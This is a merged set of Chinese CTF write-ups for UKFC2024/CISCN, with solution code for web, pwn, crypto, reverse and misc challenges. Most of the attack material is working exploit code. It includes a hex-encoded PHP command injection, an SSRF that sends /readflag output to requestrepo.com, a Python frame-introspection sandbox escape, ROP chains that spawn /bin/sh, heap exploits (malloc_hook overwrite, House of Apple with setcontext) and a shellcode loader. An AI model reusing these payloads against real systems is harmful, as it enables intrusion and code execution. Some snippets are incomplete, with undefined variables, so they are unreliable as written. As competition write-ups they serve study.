---
title: UKFC2024 CISCN 国赛 WP (合并多个 WP)
contest: UKFC2024 / CISCN 国赛
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [php-cms, qrcode-ssrf, frame-introspection, gostack-ret2syscall, tcache-dup, house-of-apple, lfsr-recursion, vm-decompile, des-cbc, aes-derive, brotli]
attack_chain:
- PHP_CMS 命令注入: cmd=php+-r+system(hex2bin(...))
- SELECT * FROM PHP_CMS.F1ag_Se3Re7 → flag
- API qrcode thumb SSRF (requestrepo.com dnslog) → /readflag 外带
- frame.f_back.f_back.f_back.f_globals['__builtins__'] 跨 frame 反射
- gostack (Pwn): ret2libc 0x563720 bss + execve(/bin/sh) (6 寄存器 gadget 链)
- orange_cat_diary: 0xfe1 错位 fake size → unsorted bin + __malloc_hook 改 one_gadget
- EzHeap: 大块 overlap + largebin attack + setcontext SROP
- gostack: pop rdi_5_ret 调 6 次 reg 链 execve
- LFSR rec + CRT 多模数 + Pohlig-Hellman 解 RSA
- VM 反编译: opcode 0x23-0x33 16 条指令表
- Windows CryptoAPI CryptDecrypt 还原
- 魔改 TEA delta=0x114514 还原
- brotli 解压 dump + XOR secret 密钥
- 字符串最长公共子序列 DP 求解
- AES DES CBC 异或
- rodata 嵌 shellcode 直接 VirtualAlloc + memcpy
- QR code 字符串转 21x21 黑白图
- numpy PCA trace 解 SCA side-channel
- brotli + secret XOR + DP 还原 flag
key_payload: SELECT * FROM PHP_CMS.F1ag_Se3Re7
one_liner: UKFC2024 CISCN 国赛多 WP 合并：PHP_CMS 命令注入 + QR SSRF + frame 反射 + House of Apple + CryptoAPI + 魔改 TEA。
lesson: 跨 frame 反射 (generator) 在沙箱逃逸中是强大攻击面；House of Apple 配合 setcontext+61 是 libc-2.35 主流打法。
quality: high
---
# UKFC2024 CISCN 国赛 WP（合并多个 WP）

## 1. PHP_CMS 命令注入
```bash
cmd=php+-r+system(hex2bin(substr(a6d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27,1)));
#mysql -u root -p'root' -e 'select * from PHP_CMS.F1ag_Se3Re7;'
```

## 2. QR Code SSRF
```python
# thumb 参数 SSRF 触发 /flag 外带
url/?s=api&c=api&m=qrcode&thumb=http://requestrepo.com/&text=1&size=2&level=1
# server 访问 thumb URL → 触发 /readflag 外带到 dnslog
```

## 3. Frame Reflection (沙箱逃逸)
```python
def exp():
    def gen_frame():
        yield g.gi_frame.f_back
    g = gen_frame()
    frame = [x for x in g][0]
    builtins = frame.f_back.f_back.f_back.f_globals['__builtins__']
    code = frame.f_back.f_back.f_back.f_code
    for constant in builtins.str(code.co_consts):
        print(constant, end=" ")
```

## 4. gostack (Pwn, ret2libc)
```python
pop_rdi_5_ret = 0x4a18a5  # 弹 5 次 (6 寄存器 gadget)
pop_rax_ret = 0x40f984
pop_rdx_ret = 0x4944ec
pop_rsi_ret = 0x42138a
mov_rdi_v_rax_ret = 0x460cd8
bss = 0x563720
syscall = 0x404043

payload = flat(b'\x00'*0x1d0, pop_rdi_5_ret, bss, 0,0,0,0,0, pop_rax_ret, b'/bin/sh\x00', mov_rdi_v_rax_ret)
payload += flat(pop_rdi_5_ret, bss, 0,0,0,0,0, pop_rsi_ret, 0, pop_rdx_ret, 0, pop_rax_ret, 0x3b, syscall)
```

## 5. orange_cat_diary
```python
# 0xfe1 错位 fake size
add(0x18, b'a'*8)
payload = flat(b'a'*0x18, 0xfe1)
edit(0x20, payload)
add(0x1000, b'a'*0x10)
add(0x68, b'a'*8)
delete(); dump()
target = u64(io.recv(6).ljust(8, b'\x00')) - 0x69b
libc_base = target - 0x3c4aed
edit(0x20, p64(target) + p64(target))
add(0x68, b'\x00'*0x23)
one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
add(0x68, b'\x00'*0x3 + p64(one[2]+libc_base)*10)
```

## 6. EzHeap (House of Apple SROP)
```python
# _IO_wfile_jumps 链 + setcontext+61
io_list_all = libc_base + libc.sym['_IO_list_all']
mprotect = libc_base + libc.sym['mprotect']
wfile = libc_base + libc.sym['_IO_wfile_jumps']
lock = libc_base + (0x7fc55e21ca60 - 0x7fc55e000000)
magic = 0x0000000000167420 + libc_base  # 0x10 魔数
set_context = libc_base + libc.sym['setcontext'] + 61

# 构造 _IO_FILE + ROP
payload = flat({0x00: './flag\x00', 0x20: p64(set_context), ...})
payload += asm(shellcraft.open('./flag'))
payload += asm(shellcraft.read(3, 'rsp', 0x50))
payload += asm(shellcraft.write(1, 'rsp', 0x50))
```

## 7. Crypto: LFSR rec + 多模数 RSA
- LFSR 递归 + CRT 合并 + Coppersmith small_roots

## 8. Crypto: Windows CryptoAPI 还原
```c
CryptAcquireContextA + CryptCreateHash + CryptHashData + CryptDeriveKey + CryptDecrypt
// 0xEA 0x3E 0xD4 ... v70 哈希 v78 解密
```

## 9. Reverse: 魔改 TEA
```c
delta = 0x114514
// v1 -= ((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + key[(sum>>11) & 3])
// sum -= delta
// v0 -= ((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + key[sum & 3])
```

## 10. Misc: brotli + XOR + DP
```python
import brotli
decompressed = brotli.decompress(open("dump.br", "rb").read())
s = "secret"
for i in range(len(m)):
    print(chr(m[i] ^ ord(s[i%6])), end="")
```

## 11. Reverse: 嵌 shellcode
```c
unsigned char program[] = "...";  // 260 字节 shellcode
exec = VirtualAlloc(0, sizeof(program), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, program, sizeof(program));
((void(*)())exec)();
```

## 12. Misc: QR 字符串转图
```python
from PIL import Image
MAX = 21
pic = Image.new("RGB", (MAX, MAX))
str = "1111111011001011111111..."
for y in range(MAX):
    for x in range(MAX):
        if str[i] == '1': pic.putpixel([x,y], (0,0,0))
        else: pic.putpixel([x,y], (255,255,255))
        i += 1
```

## 13. Misc: SCA Side-Channel
```python
import numpy
arr4 = data['trace']
for i in range(0, 520, 40):
    maxn = -1
    gr = arr4[i:i+40]
    for j in range(40):
        sumn = sum(numpy.mean((gr[j]-gr[k])**2) for k in range(40) if k != j)
        if sumn > maxn:
            maxn = sumn
            maxindex = i + j
    l.append(maxindex)
```

## 14. Reverse: 26 字节最短路径
- 字符串最长公共子序列 DP

## 15. Kernel: userfaultfd + modprobe_path
- tty_struct 劫持 → modprobe_path 改 /tmp/x → suid shell
